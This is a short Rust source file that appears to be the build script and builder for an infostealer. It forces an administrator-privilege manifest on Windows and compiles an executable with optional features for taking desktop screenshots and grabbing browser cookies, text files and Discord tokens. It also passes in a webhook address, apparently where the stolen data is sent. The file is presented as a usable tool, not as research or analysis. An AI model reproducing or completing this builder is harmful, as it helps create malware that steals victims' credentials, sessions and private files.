use std::process::Command;

fn main() {
    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        let mut res = winresource::WindowsResource::new();
        res.set_manifest(
            r#"
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
        <requestedPrivileges>
            <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
        </requestedPrivileges>
    </security>
</trustInfo>
</assembly>
"#,
        );
        res.compile().unwrap();
    }
}

pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: Option<String>) {
    let mut features = Vec::new();
    if ds {
        features.push("desktop_screenshot");
    }
    if gc {
        features.push("grab_cookies");
    }
    if gt {
        features.push("grab_txts");
    }
    if gdt {
        features.push("grab_discord_token");
    }

    let mut cmd = Command::new("cargo");

    cmd.arg("build")
        .arg("--release")
        .arg("--features")
        .arg(features.join(" "));

    if let Some(hook_uri) = webhook_uri {
        cmd.env("WEBHOOK_URI", hook_uri);
    }

    let status = cmd.status().unwrap();

    if status.success() {
        println!("Executable built successfully!");
    } else {
        println!("Failed to build executable.");
    }
}
